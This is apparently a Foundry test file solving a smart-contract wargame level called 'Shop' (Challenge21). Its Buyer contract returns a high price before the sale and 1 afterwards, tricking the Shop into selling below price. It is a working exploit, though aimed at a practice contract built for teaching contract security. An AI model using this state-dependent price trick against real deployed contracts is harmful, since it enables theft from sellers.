//SPDX-License-Identifier: MIT 
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Shop} from "../Shop.sol";

contract ShopTest is Test {
    Shop shop;
    Buyer buyer;

    function setUp() public {
        shop = new Shop();
        buyer = new Buyer(address(shop));
    }
    function test_Challenge21_Passed() public {
        vm.prank(address(buyer));
        shop.buy();
        assert(shop.isSold());
    }
}

contract Buyer {
    uint256 pricee = 100;
    address shop;

    constructor(address _shop) {
        shop = _shop;
    }

    function price()  external view returns(uint256) {
        if(!Shop(shop).isSold())  {
            return pricee;
        }
        // the price will now gets updated so i can buy in lesser price
        return 1;
    }
}